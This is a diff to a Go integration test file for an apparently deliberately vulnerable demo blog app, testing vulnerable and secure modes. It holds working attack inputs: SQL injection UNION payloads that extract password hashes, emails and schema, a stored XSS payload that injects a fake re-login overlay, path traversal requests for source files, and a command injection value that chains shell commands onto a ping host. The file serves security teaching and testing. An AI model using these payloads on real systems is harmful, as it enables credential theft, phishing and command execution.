+			"zz' UNION SELECT 9000, '[intel] database map', 'users=' || (SELECT COUNT(*) FROM users) || ' tables=' || (SELECT group_concat(name, ', ') FROM sqlite_master WHERE type='table'), 1, 'sqli-bot', '', '' --",
+			"zz' UNION SELECT 9001, '[fingerprint] SQLite ' || sqlite_version(), sqlite_source_id(), 1, 'sqli-bot', '', '' --",
+			"zz' UNION SELECT 9002, '[pivot] ' || username || ' owns drafts', (SELECT group_concat(title, ' | ') FROM blog WHERE published=0), 1, username, '', '' FROM users WHERE role='admin' --",
+		}
+		for _, p := range payloads {
+			resp := doRequest(t, router, http.MethodGet, "/api/search?q="+url.QueryEscape(p), "")
+			if resp.Code != http.StatusOK {
+				t.Fatalf("expected 200 for secure advanced payload, got %d (payload=%s body=%s)", resp.Code, p, resp.Body.String())
+			}
+			results := decodeSearchResults(t, resp.Body.Bytes())
+			if len(results) != 0 {
+				t.Fatalf("expected 0 results for secure advanced payload, got %d (payload=%s)", len(results), p)
+			}
 		}
 	})
 
@@ -575,7 +1059,7 @@ func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 	t.Run("force-vulnerable endpoint stays vulnerable even in secure mode", func(t *testing.T) {
 		// /api/search-vulnerable ignores SECURITY_ENABLED — it always concatenates,
 		// so the SQLi still works (this is intentional for the side-by-side demo).
-		payload := url.QueryEscape("' OR 1=1 --")
+		payload := url.QueryEscape("zz' UNION SELECT id, '[user] ' || username, 'role=' || role || ' email=' || email || ' secret=' || password_hash, 1, username, '', '' FROM users --")
 		resp := doRequest(t, router, http.MethodGet, "/api/search-vulnerable?q="+payload, "")
 		if resp.Code != http.StatusOK {
 			t.Fatalf("expected 200, got %d", resp.Code)
@@ -587,6 +1071,8 @@ func TestIntegration_SearchSQLi_SecureMode(t *testing.T) {
 	})
 }
 
+// TestIntegration_CreateDeleteRequireLogin_DefaultMode verifies login is required for write actions.
+// TestIntegration_CreateDeleteRequireLogin_DefaultMode verifies login is required for write actions.
 func TestIntegration_CreateDeleteRequireLogin_DefaultMode(t *testing.T) {
 	router, db, _ := setupIntegrationTestApp(t)
 	t.Cleanup(func() { _ = db.Close() })
@@ -631,7 +1117,18 @@ func TestIntegration_CreateDeleteRequireLogin_DefaultMode(t *testing.T) {
 
 const xssScriptPayload = `<script>alert('XSS-' + document.cookie)</script>`
 const xssImgPayload = `<img src=x onerror="alert(1)">`
+const xssOverlayPayload = `<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<div style=&quot;position:fixed;inset:0;z-index:9999;background:#111827;color:white;padding:40px&quot;><h1>Session expired</h1><p>Fake re-login overlay injected from a comment.</p></div>')">`
 
+// postCommentForm submits a form-based comment against the post detail route.
+//
+// Inputs:
+//   - t: testing handle used for fatal failures.
+//   - router: test Gin engine.
+//   - postID: target post identifier.
+//   - body: comment body to submit.
+//
+// Output:
+//   - *httptest.ResponseRecorder: captured response.
 func postCommentForm(t *testing.T, router *gin.Engine, postID int, body string) *httptest.ResponseRecorder {
 	t.Helper()
 	form := url.Values{}
@@ -639,6 +1136,8 @@ func postCommentForm(t *testing.T, router *gin.Engine, postID int, body string) 
 	return doFormRequest(t, router, http.MethodPost, "/ui/posts/view/"+strconv.Itoa(postID)+"/comments", form.Encode())
 }
 
+// TestIntegration_StoredXSS_VulnerableMode verifies the raw-comment XSS demo.
+// TestIntegration_StoredXSS_VulnerableMode verifies the raw-comment XSS demo.
 func TestIntegration_StoredXSS_VulnerableMode(t *testing.T) {
 	router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, false)
 	t.Cleanup(func() { _ = dbConn.Close() })
@@ -676,8 +1175,21 @@ func TestIntegration_StoredXSS_VulnerableMode(t *testing.T) {
 			t.Fatalf("expected onerror attribute preserved; body=%s", resp.Body.String())
 		}
 	})
+
+	t.Run("overlay_payload_can_take_over_reader_ui", func(t *testing.T) {
+		resp := postCommentForm(t, router, postID, xssOverlayPayload)
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d", resp.Code)
+		}
+		body := resp.Body.String()
+		if !strings.Contains(body, "insertAdjacentHTML") || !strings.Contains(body, "Fake re-login overlay") {
+			t.Fatalf("expected UI takeover payload to be preserved raw; body=%s", body)
+		}
+	})
 }
 
+// TestIntegration_StoredXSS_SecureMode verifies that comments are escaped in secure mode.
+// TestIntegration_StoredXSS_SecureMode verifies that comments are escaped in secure mode.
 func TestIntegration_StoredXSS_SecureMode(t *testing.T) {
 	router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, true)
 	t.Cleanup(func() { _ = dbConn.Close() })
@@ -711,6 +1223,17 @@ func TestIntegration_StoredXSS_SecureMode(t *testing.T) {
 		}
 	})
 
+	t.Run("overlay_payload_is_rendered_inert", func(t *testing.T) {
+		resp := postCommentForm(t, router, postID, xssOverlayPayload)
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected 200, got %d", resp.Code)
+		}
+		body := resp.Body.String()
+		if strings.Contains(body, "insertAdjacentHTML") || strings.Contains(body, `onerror=`) {
+			t.Fatalf("secure mode must not preserve UI takeover JavaScript; body=%s", body)
+		}
+	})
+
 	t.Run("force_vulnerable_endpoint_still_stores_raw", func(t *testing.T) {
 		// /api/comments-vulnerable bypasses the toggle.
 		form := url.Values{}
@@ -734,6 +1257,8 @@ func TestIntegration_StoredXSS_SecureMode(t *testing.T) {
 	})
 }
 
+// TestIntegration_PathTraversal_LFI verifies the vulnerable and secure file read flows.
+// TestIntegration_PathTraversal_LFI verifies the vulnerable and secure file read flows.
 func TestIntegration_PathTraversal_LFI(t *testing.T) {
 	t.Run("vulnerable endpoint reads outside uploads", func(t *testing.T) {
 		router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, false)
@@ -745,6 +1270,19 @@ func TestIntegration_PathTraversal_LFI(t *testing.T) {
 		}
 		if !strings.Contains(resp.Body.String(), "module BAI_1IZ21B_PROJEKT") {
 			t.Fatalf("expected vulnerable endpoint to read go.mod, got: %s", resp.Body.String())
+		}
+	})
+
+	t.Run("vulnerable endpoint leaks source code through traversal", func(t *testing.T) {
+		router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, false)
+		t.Cleanup(func() { _ = dbConn.Close() })
+
+		resp := doRequest(t, router, http.MethodGet, "/api/files-vulnerable?name=../internal/db/db.go", "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected status %d, got %d (body=%s)", http.StatusOK, resp.Code, resp.Body.String())
+		}
+		if !strings.Contains(resp.Body.String(), "func SeedDB") || !strings.Contains(resp.Body.String(), "Unpublished Magical Mirai") {
+			t.Fatalf("expected source disclosure to expose seed logic, got: %s", resp.Body.String())
 		}
 	})
 
@@ -760,8 +1298,20 @@ func TestIntegration_PathTraversal_LFI(t *testing.T) {
 			t.Fatalf("expected traversal block message, got: %s", resp.Body.String())
 		}
 	})
+
+	t.Run("secure endpoint blocks source-code traversal", func(t *testing.T) {
+		router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, true)
+		t.Cleanup(func() { _ = dbConn.Close() })
+
+		resp := doRequest(t, router, http.MethodGet, "/api/files-secure?name=../internal/db/db.go", "")
+		if resp.Code != http.StatusBadRequest {
+			t.Fatalf("expected status %d, got %d (body=%s)", http.StatusBadRequest, resp.Code, resp.Body.String())
+		}
+	})
 }
 
+// TestIntegration_CommandInjection verifies the vulnerable and secure ping flows.
+// TestIntegration_CommandInjection verifies the vulnerable and secure ping flows.
 func TestIntegration_CommandInjection(t *testing.T) {
 	t.Run("vulnerable endpoint executes appended shell command", func(t *testing.T) {
 		router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, false)
@@ -774,6 +1324,20 @@ func TestIntegration_CommandInjection(t *testing.T) {
 		}
 		if !strings.Contains(resp.Body.String(), "BAI_CMD_INJECTION") {
 			t.Fatalf("expected injected command output, got: %s", resp.Body.String())
+		}
+	})
+
+	t.Run("vulnerable endpoint executes chained reconnaissance commands", func(t *testing.T) {
+		router, dbConn, _ := setupIntegrationTestAppWithSecurity(t, false)
+		t.Cleanup(func() { _ = dbConn.Close() })
+
+		payload := url.QueryEscape("127.0.0.1; printf BAI_CHAIN_MARKER; uname -s")
+		resp := doRequest(t, router, http.MethodGet, "/api/ping-vulnerable?host="+payload, "")
+		if resp.Code != http.StatusOK {
+			t.Fatalf("expected status %d, got %d", http.StatusOK, resp.Code)
+		}
+		if !strings.Contains(resp.Body.String(), "BAI_CHAIN_MARKER") {
+			t.Fatalf("expected chained command marker, got: %s", resp.Body.String())
 		}
 	})
 
